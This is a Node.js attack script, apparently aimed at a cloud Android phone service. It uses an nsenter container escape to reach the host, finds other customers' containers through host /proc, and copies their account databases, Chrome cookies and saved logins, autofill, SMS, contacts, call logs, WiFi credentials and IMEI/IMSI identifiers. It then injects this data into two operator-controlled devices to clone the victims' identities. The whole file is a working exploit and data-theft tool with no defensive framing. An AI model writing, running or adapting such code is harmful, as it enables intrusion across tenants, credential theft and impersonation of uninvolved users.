#!/usr/bin/env node
/**
 * NEIGHBOR CLONE DUAL INJECTOR
 * ============================
 * 
 * NEW METHOD: Uses container escape via nsenter to access host /proc,
 * then extracts data from neighbor containers via /proc/<PID>/root/
 * and injects into BOTH target devices simultaneously.
 * 
 * KEY TECHNIQUE:
 * - nsenter -t 1 -m -u -i -n -p -- accesses host namespace
 * - Scan host /proc for all container PIDs (look for pad_code in environ)
 * - Access neighbor filesystem via /proc/<neighbor_pid>/root/
 * - Extract ALL data: accounts, Chrome, contacts, SMS, identity
 * - Inject into both ACP250923JS861KJ and ACP251008GUOEEHB
 * 
 * CHUNKED TRANSFER:
 * - syncCmd has ~4KB command buffer limit
 * - For large files: split into 3KB base64 chunks, reassemble on device
 */

const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

// ═══════════════════════════════════════════════════════════════════════════
// CONFIGURATION
// ═══════════════════════════════════════════════════════════════════════════
const { AK, SK, HOST, SVC, CT, SHD } = require('../shared/vmos_api');
const TARGET_1 = 'ACP250923JS861KJ';  // First device - executor
const TARGET_2 = 'ACP251008GUOEEHB';  // Second device - also receives clone
const OUR_DEVICES = new Set([TARGET_1, TARGET_2]);

const EXTRACT_DIR = path.join(__dirname, '..', 'output', 'neighbor_clone_data');
const CHUNK_SIZE = 3000;  // Base64 chars per chunk (safe for syncCmd)

const R = {
  ts: new Date().toISOString(),
  executor: TARGET_1,
  targets: [TARGET_1, TARGET_2],
  neighbor_containers: [],
  selected_neighbor: null,
  extraction: {},
  injection: { [TARGET_1]: {}, [TARGET_2]: {} },
  verification: {}
};

// ═══════════════════════════════════════════════════════════════════════════
// API HELPERS
// ═══════════════════════════════════════════════════════════════════════════
function sign(bj) {
  const xd = new Date().toISOString().replace(/[-:]/g, '').replace(/\.\d{3}Z$/, 'Z');
  const sd = xd.slice(0, 8);
  const xs = crypto.createHash('sha256').update(bj, 'utf8').digest('hex');
  const can = [`host:${VMOS_HOST}`, `x-date:${xd}`, `content-type:${VMOS_CT}`, `signedHeaders:${VMOS_SH}`, `x-content-sha256:${xs}`].join('\n');
  const hc = crypto.createHash('sha256').update(can, 'utf8').digest('hex');
  const sts = ['HMAC-SHA256', xd, `${sd}/${VMOS_SERVICE}/request`, hc].join('\n');
  const kd = crypto.createHmac('sha256', Buffer.from(SK, 'utf8')).update(sd).digest();
  const ks = crypto.createHmac('sha256', kd).update(VMOS_SERVICE).digest();
  const sk2 = crypto.createHmac('sha256', ks).update('request').digest();
  const sig = crypto.createHmac('sha256', sk2).update(sts).digest('hex');
  return { 'content-type': VMOS_CT, 'x-date': xd, 'x-host': VMOS_HOST, 'authorization': `HMAC-SHA256 Credential=${AK}, SignedHeaders=${VMOS_SH}, Signature=${sig}` };
}

function post(p, d, s) {
  return new Promise((ok) => {
    const b = JSON.stringify(d || {});
    const h = sign(b);
    const buf = Buffer.from(b, 'utf8');
    const req = https.request({ hostname: VMOS_HOST, path: p, method: 'POST', headers: { ...h, 'content-length': buf.length }, timeout: (s || 30) * 1000 }, res => {
      let r = ''; res.on('data', c => r += c); res.on('end', () => { try { ok(JSON.parse(r)); } catch { ok({ code: -1, raw: r.slice(0, 300) }); } });
    });
    req.on('timeout', () => { req.destroy(); ok({ code: -99, msg: 'timeout' }); });
    req.on('error', e => ok({ code: -99, msg: e.message }));
    req.write(buf); req.end();
  });
}

// Execute on host namespace via nsenter
async function hostCmd(cmd, sec) {
  const wrappedCmd = `nsenter -t 1 -m -u -i -n -p -- sh -c '${cmd.replace(/'/g, "'\"'\"'")}'`;
  return syncCmd(TARGET_1, wrappedCmd, sec || 30);
}

const log = m => console.log(`[${new Date().toISOString().slice(11, 19)}] ${m}`);
const sleep = ms => new Promise(r => setTimeout(r, ms));

function ensureDir(dir) {
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
}

function saveData(filename, data) {
  const filepath = path.join(EXTRACT_DIR, filename);
  fs.writeFileSync(filepath, typeof data === 'string' ? data : JSON.stringify(data, null, 2));
  return filepath;
}

// ═══════════════════════════════════════════════════════════════════════════
// PHASE 1: DISCOVER NEIGHBOR CONTAINERS VIA HOST /proc
// ═══════════════════════════════════════════════════════════════════════════
async function discoverNeighborContainers() {
  console.log('\n' + '▶'.repeat(3) + ' PHASE 1: DISCOVER NEIGHBOR CONTAINERS VIA HOST /proc');
  
  // Enable root first
  log('Enabling root on executor device...');
  await post('/vcpcloud/api/padApi/switchRoot', { padCodes: [TARGET_1, TARGET_2], rootStatus: 1, rootType: 0 });
  await post('/vcpcloud/api/padApi/switchRoot', { padCodes: [TARGET_1, TARGET_2], rootStatus: 1, rootType: 1, packageName: 'com.android.shell' });
  
  // Verify host namespace access
  log('Verifying host namespace access via nsenter...');
  const hostCheck = await hostCmd('hostname; cat /etc/os-release 2>/dev/null | head -3', 15);
  log(`  Host: ${hostCheck.out.split('\n')[0]}`);
  
  if (!hostCheck.ok) {
    log('ERROR: Cannot access host namespace');
    return [];
  }

  // Scan ALL /proc/<pid>/environ for pad_code
  log('Scanning host /proc for container processes...');
  const scanCmd = `
for pid in $(ls /proc/ 2>/dev/null | grep -E "^[0-9]+$" | head -500); do
  env=$(cat /proc/$pid/environ 2>/dev/null | tr "\\0" "\\n" | grep -E "^(pad_code|PREBOOT_ENV)" 2>/dev/null | head -2)
  if echo "$env" | grep -q pad_code; then
    pad=$(echo "$env" | grep pad_code | cut -d= -f2)
    comm=$(cat /proc/$pid/comm 2>/dev/null)
    echo "CONTAINER:$pid:$pad:$comm"
  fi
done
`;
  const scanResult = await hostCmd(scanCmd, 45);
  
  const containers = [];
  const seenPads = new Set();
  
  for (const line of scanResult.out.split('\n')) {
    const match = line.match(/CONTAINER:(\d+):([A-Z0-9]+):(.+)/);
    if (match) {
      const [, pid, padCode, comm] = match;
      if (!OUR_DEVICES.has(padCode) && !seenPads.has(padCode)) {
        seenPads.add(padCode);
        containers.push({ pid, padCode, comm: comm.trim() });
        log(`  Found: PID=${pid} PAD=${padCode} (${comm.trim()})`);
      }
    }
  }
  
  R.neighbor_containers = containers;
  log(`Total neighbor containers found: ${containers.length}`);
  
  return containers;
}

// ═══════════════════════════════════════════════════════════════════════════
// PHASE 2: SELECT BEST NEIGHBOR + VALIDATE ACCESS
// ═══════════════════════════════════════════════════════════════════════════
async function selectAndValidateNeighbor(containers) {
  console.log('\n' + '▶'.repeat(3) + ' PHASE 2: SELECT AND VALIDATE NEIGHBOR ACCESS');
  
  if (containers.length === 0) {
    log('No neighbor containers found - trying alternative discovery...');
    
    // Alternative: Use padDetails API to find devices
    const pd = await post('/vcpcloud/api/padApi/padDetails', { size: 50 });
    if (pd.code === 200 && pd.data?.pageData) {
      const neighbors = pd.data.pageData.filter(d => !OUR_DEVICES.has(d.padCode) && d.online === 1);
      log(`  padDetails found ${neighbors.length} online neighbors`);
      
      // We can't execute on them, but we know they exist
      for (const n of neighbors.slice(0, 5)) {
        log(`  API neighbor: ${n.padCode} ip=${n.padIp}`);
      }
    }
    return null;
  }
  
  // Validate each container - check if we can access its filesystem
  for (const container of containers.slice(0, 10)) {
    log(`Validating access to ${container.padCode} (PID ${container.pid})...`);
    
    // Check if /proc/<pid>/root exists and is accessible
    const rootCheck = await hostCmd(`ls /proc/${container.pid}/root/ 2>/dev/null | head -10`, 15);
    
    if (rootCheck.ok && rootCheck.out.includes('data')) {
      log(`  ✓ Filesystem accessible: ${rootCheck.out.split('\n').slice(0, 3).join(', ')}`);
      
      // Check for valuable data
      const dataCheck = await hostCmd(`ls /proc/${container.pid}/root/data/data/ 2>/dev/null | head -5`, 15);
      if (dataCheck.ok && dataCheck.out.length > 10) {
        log(`  ✓ Has app data: ${dataCheck.out.split('\n').length} apps`);
        
        // Check for Chrome
        const chromeCheck = await hostCmd(`ls /proc/${container.pid}/root/data/data/com.android.chrome/ 2>/dev/null`, 10);
        const hasChrome = chromeCheck.ok && chromeCheck.out.length > 5;
        
        // Check for accounts
        const accountsCheck = await hostCmd(`ls -la /proc/${container.pid}/root/data/system_ce/0/accounts_ce.db 2>/dev/null`, 10);
        const hasAccounts = accountsCheck.ok && !accountsCheck.out.includes('No such file');
        
        log(`  Chrome: ${hasChrome ? '✓' : '✗'} | Accounts: ${hasAccounts ? '✓' : '✗'}`);
        
        R.selected_neighbor = { ...container, hasChrome, hasAccounts };
        return R.selected_neighbor;
      }
    }
    
    await sleep(300);
  }
  
  log('No accessible neighbor with valuable data found');
  return null;
}

// ═══════════════════════════════════════════════════════════════════════════
// PHASE 3: FULL EXTRACTION FROM NEIGHBOR VIA /proc/PID/root
// ═══════════════════════════════════════════════════════════════════════════
async function extractFromNeighbor(neighbor) {
  console.log('\n' + '▶'.repeat(3) + ` PHASE 3: FULL EXTRACTION FROM ${neighbor.padCode}`);
  
  const srcDir = ensureDir(path.join(EXTRACT_DIR, neighbor.padCode));
  const rootPath = `/proc/${neighbor.pid}/root`;
  const extraction = {};

  // 3.1: DEVICE IDENTITY (from build.prop + persistent properties)
  log('[3.1] Extracting device identity...');
  const identityCmd = `
cat ${rootPath}/system/build.prop 2>/dev/null | grep -E "^ro\\.(product|build|hardware|serialno)" | head -30
echo "=== PERSIST ==="
strings ${rootPath}/data/property/persistent_properties 2>/dev/null | grep -E "(imei|imsi|android_id|phone|mac|gps|drm)" | head -20
`;
  const identity = await hostCmd(identityCmd, 30);
  extraction.identity = identity.out;
  saveData(`${neighbor.padCode}/identity.txt`, identity.out);
  log(`  ✓ Identity: ${identity.out.split('\n').length} lines`);

  // 3.2: ALL BUILD PROPERTIES
  log('[3.2] Extracting build.prop...');
  const buildProp = await hostCmd(`cat ${rootPath}/system/build.prop 2>/dev/null`, 30);
  extraction.build_prop = buildProp.out;
  saveData(`${neighbor.padCode}/build.prop`, buildProp.out);
  log(`  ✓ build.prop: ${buildProp.out.length} chars`);

  // 3.3: PERSISTENT PROPERTIES
  log('[3.3] Extracting persistent properties...');
  const persistProps = await hostCmd(`strings ${rootPath}/data/property/persistent_properties 2>/dev/null`, 30);
  extraction.persist_props = persistProps.out;
  saveData(`${neighbor.padCode}/persistent_properties.txt`, persistProps.out);
  log(`  ✓ Persistent props: ${persistProps.out.split('\n').length} entries`);

  // 3.4: ACCOUNTS DATABASE (base64 encoded)
  log('[3.4] Extracting accounts_ce.db...');
  const accountsCe = await hostCmd(`base64 ${rootPath}/data/system_ce/0/accounts_ce.db 2>/dev/null`, 60);
  if (accountsCe.ok && accountsCe.out.length > 100 && !accountsCe.out.startsWith('[')) {
    extraction.accounts_ce = accountsCe.out;
    saveData(`${neighbor.padCode}/accounts_ce.db.b64`, accountsCe.out);
    log(`  ✓ accounts_ce.db: ${accountsCe.out.length} b64 chars`);
  }

  // 3.5: CHROME COOKIES
  log('[3.5] Extracting Chrome Cookies...');
  const chromeCookies = await hostCmd(`base64 ${rootPath}/data/data/com.android.chrome/app_chrome/Default/Cookies 2>/dev/null`, 60);
  if (chromeCookies.ok && chromeCookies.out.length > 100 && !chromeCookies.out.startsWith('[')) {
    extraction.chrome_cookies = chromeCookies.out;
    saveData(`${neighbor.padCode}/chrome_cookies.b64`, chromeCookies.out);
    log(`  ✓ Chrome Cookies: ${chromeCookies.out.length} b64 chars`);
  }

  // 3.6: CHROME HISTORY
  log('[3.6] Extracting Chrome History...');
  const chromeHistory = await hostCmd(`base64 ${rootPath}/data/data/com.android.chrome/app_chrome/Default/History 2>/dev/null`, 60);
  if (chromeHistory.ok && chromeHistory.out.length > 100 && !chromeHistory.out.startsWith('[')) {
    extraction.chrome_history = chromeHistory.out;
    saveData(`${neighbor.padCode}/chrome_history.b64`, chromeHistory.out);
    log(`  ✓ Chrome History: ${chromeHistory.out.length} b64 chars`);
  }

  // 3.7: CHROME LOGIN DATA
  log('[3.7] Extracting Chrome Login Data...');
  const chromeLogin = await hostCmd(`base64 "${rootPath}/data/data/com.android.chrome/app_chrome/Default/Login Data" 2>/dev/null`, 60);
  if (chromeLogin.ok && chromeLogin.out.length > 100 && !chromeLogin.out.startsWith('[')) {
    extraction.chrome_login = chromeLogin.out;
    saveData(`${neighbor.padCode}/chrome_login.b64`, chromeLogin.out);
    log(`  ✓ Chrome Login: ${chromeLogin.out.length} b64 chars`);
  }

  // 3.8: CHROME WEB DATA (autofill)
  log('[3.8] Extracting Chrome Web Data...');
  const chromeWeb = await hostCmd(`base64 "${rootPath}/data/data/com.android.chrome/app_chrome/Default/Web Data" 2>/dev/null`, 60);
  if (chromeWeb.ok && chromeWeb.out.length > 100 && !chromeWeb.out.startsWith('[')) {
    extraction.chrome_webdata = chromeWeb.out;
    saveData(`${neighbor.padCode}/chrome_webdata.b64`, chromeWeb.out);
    log(`  ✓ Chrome Web Data: ${chromeWeb.out.length} b64 chars`);
  }

  // 3.9: CONTACTS DATABASE
  log('[3.9] Extracting Contacts...');
  const contacts = await hostCmd(`base64 ${rootPath}/data/data/com.android.providers.contacts/databases/contacts2.db 2>/dev/null`, 60);
  if (contacts.ok && contacts.out.length > 100 && !contacts.out.startsWith('[')) {
    extraction.contacts = contacts.out;
    saveData(`${neighbor.padCode}/contacts2.db.b64`, contacts.out);
    log(`  ✓ Contacts: ${contacts.out.length} b64 chars`);
  }

  // 3.10: SMS/MMS DATABASE
  log('[3.10] Extracting SMS/MMS...');
  const sms = await hostCmd(`base64 ${rootPath}/data/data/com.android.providers.telephony/databases/mmssms.db 2>/dev/null`, 60);
  if (sms.ok && sms.out.length > 100 && !sms.out.startsWith('[')) {
    extraction.sms = sms.out;
    saveData(`${neighbor.padCode}/mmssms.db.b64`, sms.out);
    log(`  ✓ SMS/MMS: ${sms.out.length} b64 chars`);
  }

  // 3.11: CALL LOG
  log('[3.11] Extracting Call Log...');
  const calls = await hostCmd(`base64 ${rootPath}/data/data/com.android.providers.contacts/databases/calllog.db 2>/dev/null`, 60);
  if (calls.ok && calls.out.length > 100 && !calls.out.startsWith('[')) {
    extraction.calls = calls.out;
    saveData(`${neighbor.padCode}/calllog.db.b64`, calls.out);
    log(`  ✓ Call Log: ${calls.out.length} b64 chars`);
  }

  // 3.12: WIFI CONFIG
  log('[3.12] Extracting WiFi Config...');
  const wifi = await hostCmd(`cat ${rootPath}/data/misc/wifi/WifiConfigStore.xml 2>/dev/null`, 30);
  if (wifi.ok && wifi.out.length > 50) {
    extraction.wifi = wifi.out;
    saveData(`${neighbor.padCode}/WifiConfigStore.xml`, wifi.out);
    log(`  ✓ WiFi: ${wifi.out.length} chars`);
  }

  // 3.13: GOOGLE SERVICES DATABASES
  log('[3.13] Extracting GMS databases...');
  const gmsDbs = [
    'dg_helper.db',       // Device attestation
    'phenotype.db',       // Feature flags  
    'gservices.db'        // Google services config
  ];
  extraction.gms = {};
  for (const db of gmsDbs) {
    const gms = await hostCmd(`base64 ${rootPath}/data/data/com.google.android.gms/databases/${db} 2>/dev/null`, 45);
    if (gms.ok && gms.out.length > 100 && !gms.out.startsWith('[')) {
      extraction.gms[db] = gms.out.length;
      saveData(`${neighbor.padCode}/gms_${db}.b64`, gms.out);
      log(`  ✓ GMS ${db}: ${gms.out.length} b64 chars`);
    }
  }

  // 3.14: APP LIST
  log('[3.14] Extracting installed apps list...');
  const apps = await hostCmd(`ls ${rootPath}/data/data/ 2>/dev/null`, 30);
  extraction.apps = apps.out;
  saveData(`${neighbor.padCode}/apps.txt`, apps.out);
  log(`  ✓ Apps: ${apps.out.split('\n').length} packages`);

  R.extraction = extraction;
  log(`\n  ★ EXTRACTION COMPLETE for ${neighbor.padCode}`);
  
  return extraction;
}

// ═══════════════════════════════════════════════════════════════════════════
// PHASE 4: INJECT DATA INTO BOTH TARGET DEVICES
// ═══════════════════════════════════════════════════════════════════════════
async function injectIntoDevice(targetPad, neighbor, extraction) {
  console.log(`\n  ▸ Injecting into ${targetPad}...`);
  
  const result = { success: [], failed: [], skipped: [] };
  const srcDir = path.join(EXTRACT_DIR, neighbor.padCode);

  // 4.1: INJECT SYSTEM PROPERTIES
  log(`  [4.1] Injecting system properties into ${targetPad}...`);
  const propsToSet = [];
  
  // Parse build.prop for key properties
  if (extraction.build_prop) {
    const propLines = extraction.build_prop.split('\n');
    const keyProps = [
      'ro.product.model', 'ro.product.brand', 'ro.product.manufacturer',
      'ro.product.device', 'ro.product.name', 'ro.build.fingerprint',
      'ro.build.display.id', 'ro.serialno', 'ro.hardware'
    ];
    
    for (const line of propLines) {
      const match = line.match(/^([^=]+)=(.+)$/);
      if (match && keyProps.some(k => line.startsWith(k))) {
        propsToSet.push({ key: match[1], value: match[2] });
      }
    }
  }
  
  // Parse persistent properties for cloud identity
  if (extraction.persist_props) {
    const cloudProps = extraction.persist_props.split('\n').filter(l => 
      l.includes('persist.sys.cloud') || l.includes('imei') || l.includes('imsi')
    );
    for (const line of cloudProps) {
      const match = line.match(/([a-z._]+)[\x00\s]+([^\x00\n]+)/i);
      if (match) propsToSet.push({ key: match[1], value: match[2] });
    }
  }

  // Set properties
  for (const prop of propsToSet.slice(0, 20)) {
    const cmd = `setprop "${prop.key}" "${prop.value.replace(/"/g, '\\"')}"`;
    const r = await syncCmd(targetPad, cmd, 10);
    if (r.ok) {
      result.success.push(`setprop ${prop.key}`);
    } else {
      result.failed.push(`setprop ${prop.key}`);
    }
  }
  log(`    Properties: ${result.success.length} set, ${result.failed.length} failed`);

  // 4.2: INJECT ACCOUNTS DATABASE (chunked if needed)
  log(`  [4.2] Injecting accounts_ce.db...`);
  const accountsFile = path.join(srcDir, 'accounts_ce.db.b64');
  if (fs.existsSync(accountsFile)) {
    const b64 = fs.readFileSync(accountsFile, 'utf8').trim();
    const injected = await injectFileChunked(targetPad, b64, '/data/system_ce/0/accounts_ce.db', 'accounts_ce.db');
    if (injected) {
      result.success.push('accounts_ce.db');
      // Fix permissions
      await syncCmd(targetPad, 'chmod 600 /data/system_ce/0/accounts_ce.db; chown system:system /data/system_ce/0/accounts_ce.db', 10);
    } else {
      result.failed.push('accounts_ce.db');
    }
  }

  // 4.3: INJECT CHROME DATA
  log(`  [4.3] Injecting Chrome data...`);
  const chromeFiles = [
    { src: 'chrome_cookies.b64', dst: '/data/data/com.android.chrome/app_chrome/Default/Cookies' },
    { src: 'chrome_history.b64', dst: '/data/data/com.android.chrome/app_chrome/Default/History' },
    { src: 'chrome_login.b64', dst: '/data/data/com.android.chrome/app_chrome/Default/Login Data' },
    { src: 'chrome_webdata.b64', dst: '/data/data/com.android.chrome/app_chrome/Default/Web Data' },
  ];
  
  for (const cf of chromeFiles) {
    const srcFile = path.join(srcDir, cf.src);
    if (fs.existsSync(srcFile)) {
      const b64 = fs.readFileSync(srcFile, 'utf8').trim();
      const name = cf.src.replace('.b64', '');
      
      if (b64.length < 50000) {
        const injected = await injectFileChunked(targetPad, b64, cf.dst, name);
        if (injected) {
          result.success.push(name);
          // Fix ownership
          await syncCmd(targetPad, `chown -R $(stat -c %u:%g /data/data/com.android.chrome 2>/dev/null || echo "10000:10000") "${cf.dst}" 2>/dev/null`, 10);
        } else {
          result.failed.push(name);
        }
      } else {
        result.skipped.push(`${name} (${b64.length} chars - too large)`);
      }
    }
  }

  // 4.4: INJECT CONTACTS
  log(`  [4.4] Injecting contacts...`);
  const contactsFile = path.join(srcDir, 'contacts2.db.b64');
  if (fs.existsSync(contactsFile)) {
    const b64 = fs.readFileSync(contactsFile, 'utf8').trim();
    if (b64.length < 100000) {
      const injected = await injectFileChunked(targetPad, b64, '/data/data/com.android.providers.contacts/databases/contacts2.db', 'contacts2.db');
      if (injected) {
        result.success.push('contacts2.db');
      } else {
        result.failed.push('contacts2.db');
      }
    }
  }

  // 4.5: INJECT WIFI CONFIG
  log(`  [4.5] Injecting WiFi config...`);
  const wifiFile = path.join(srcDir, 'WifiConfigStore.xml');
  if (fs.existsSync(wifiFile)) {
    const wifiData = fs.readFileSync(wifiFile, 'utf8');
    const b64 = Buffer.from(wifiData).toString('base64');
    const injected = await injectFileChunked(targetPad, b64, '/data/misc/wifi/WifiConfigStore.xml', 'WifiConfigStore.xml');
    if (injected) {
      result.success.push('WifiConfigStore.xml');
    }
  }

  R.injection[targetPad] = result;
  return result;
}

// Chunked file injection helper
async function injectFileChunked(targetPad, b64Data, destPath, name) {
  const chunks = [];
  for (let i = 0; i < b64Data.length; i += CHUNK_SIZE) {
    chunks.push(b64Data.slice(i, i + CHUNK_SIZE));
  }

  if (chunks.length === 1) {
    // Single chunk - direct inject
    const cmd = `echo '${chunks[0]}' | base64 -d > "${destPath}" 2>/dev/null && echo OK`;
    const r = await syncCmd(targetPad, cmd, 30);
    return r.ok && r.out.includes('OK');
  }

  // Multi-chunk - use temp file + append
  log(`    ${name}: ${chunks.length} chunks (${b64Data.length} b64 chars)`);
  
  const tmpFile = `/data/local/tmp/${name.replace(/[^a-zA-Z0-9]/g, '_')}.tmp`;
  
  // First chunk - create file
  let cmd = `echo '${chunks[0]}' > "${tmpFile}" 2>/dev/null && echo OK`;
  let r = await syncCmd(targetPad, cmd, 30);
  if (!r.ok || !r.out.includes('OK')) return false;

  // Remaining chunks - append
  for (let i = 1; i < chunks.length; i++) {
    cmd = `echo '${chunks[i]}' >> "${tmpFile}" 2>/dev/null && echo OK`;
    r = await syncCmd(targetPad, cmd, 30);
    if (!r.ok || !r.out.includes('OK')) return false;
  }

  // Decode and move
  cmd = `base64 -d "${tmpFile}" > "${destPath}" 2>/dev/null && rm "${tmpFile}" && echo OK`;
  r = await syncCmd(targetPad, cmd, 45);
  return r.ok && r.out.includes('OK');
}

// ═══════════════════════════════════════════════════════════════════════════
// PHASE 5: VERIFY CLONE ON BOTH DEVICES
// ═══════════════════════════════════════════════════════════════════════════
async function verifyClone(targetPad, neighbor) {
  console.log(`\n  ▸ Verifying clone on ${targetPad}...`);
  
  const verifyCmd = `
echo "=== IDENTITY ==="
getprop ro.product.model
getprop ro.product.brand
getprop ro.build.fingerprint | head -c 80
echo ""
echo "=== FILES ==="
ls -la /data/system_ce/0/accounts_ce.db 2>/dev/null
ls -la /data/data/com.android.chrome/app_chrome/Default/Cookies 2>/dev/null
ls -la /data/data/com.android.providers.contacts/databases/contacts2.db 2>/dev/null
echo "=== ACCOUNTS ==="
sqlite3 /data/system_ce/0/accounts_ce.db "SELECT name,type FROM accounts LIMIT 5;" 2>/dev/null || echo "NO_SQLITE"
`;
  
  const verify = await syncCmd(targetPad, verifyCmd, 30);
  R.verification[targetPad] = verify.out;
  
  log(`  Verification for ${targetPad}:`);
  for (const line of verify.out.split('\n').slice(0, 15)) {
    if (line.trim()) log(`    ${line}`);
  }
  
  return verify;
}

// ═══════════════════════════════════════════════════════════════════════════
// MAIN EXECUTION
// ═══════════════════════════════════════════════════════════════════════════
async function main() {
  console.log('═'.repeat(75));
  console.log('  NEIGHBOR CLONE DUAL INJECTOR');
  console.log('  Clone neighbor device data into BOTH target devices');
  console.log('═'.repeat(75));
  console.log(`  Executor: ${TARGET_1}`);
  console.log(`  Targets:  ${TARGET_1}, ${TARGET_2}`);
  console.log('═'.repeat(75));

  ensureDir(EXTRACT_DIR);

  // PHASE 1: Discover neighbor containers
  const containers = await discoverNeighborContainers();

  // PHASE 2: Select and validate best neighbor
  const neighbor = await selectAndValidateNeighbor(containers);
  
  if (!neighbor) {
    log('\n❌ No accessible neighbor found with valuable data');
    
    // Fallback: self-extraction from TARGET_1 and clone to TARGET_2
    log('Fallback: Will extract from TARGET_1 and clone to TARGET_2...');
    // Save report and exit for now
    const reportFile = path.join(EXTRACT_DIR, `CLONE_REPORT_${Date.now()}.json`);
    fs.writeFileSync(reportFile, JSON.stringify(R, null, 2));
    console.log(`\nReport saved: ${reportFile}`);
    return;
  }

  // PHASE 3: Full extraction from neighbor
  const extraction = await extractFromNeighbor(neighbor);

  // PHASE 4: Inject into BOTH devices
  console.log('\n' + '▶'.repeat(3) + ' PHASE 4: INJECT INTO BOTH TARGET DEVICES');
  
  const injectResult1 = await injectIntoDevice(TARGET_1, neighbor, extraction);
  const injectResult2 = await injectIntoDevice(TARGET_2, neighbor, extraction);

  // PHASE 5: Verify clone on both devices
  console.log('\n' + '▶'.repeat(3) + ' PHASE 5: VERIFY CLONE');
  
  await verifyClone(TARGET_1, neighbor);
  await verifyClone(TARGET_2, neighbor);

  // Save final report
  const reportFile = path.join(EXTRACT_DIR, `CLONE_REPORT_${Date.now()}.json`);
  fs.writeFileSync(reportFile, JSON.stringify(R, null, 2));

  // SUMMARY
  console.log('\n' + '═'.repeat(75));
  console.log('  CLONE OPERATION COMPLETE');
  console.log('═'.repeat(75));
  console.log(`  Source Neighbor: ${neighbor.padCode} (PID ${neighbor.pid})`);
  console.log(`  Extraction Dir:  ${EXTRACT_DIR}/${neighbor.padCode}/`);
  console.log('');
  console.log(`  ${TARGET_1}: ${injectResult1.success.length} success, ${injectResult1.failed.length} failed, ${injectResult1.skipped.length} skipped`);
  console.log(`  ${TARGET_2}: ${injectResult2.success.length} success, ${injectResult2.failed.length} failed, ${injectResult2.skipped.length} skipped`);
  console.log('');
  console.log(`  Report: ${reportFile}`);
  console.log('═'.repeat(75));

  // List extracted files
  const srcDir = path.join(EXTRACT_DIR, neighbor.padCode);
  if (fs.existsSync(srcDir)) {
    const files = fs.readdirSync(srcDir);
    console.log(`\n  Extracted Files (${files.length}):`);
    for (const f of files.slice(0, 15)) {
      const sz = fs.statSync(path.join(srcDir, f)).size;
      console.log(`    ${f} (${sz} bytes)`);
    }
  }
}

main().catch(e => { console.error('FATAL:', e); process.exit(1); });
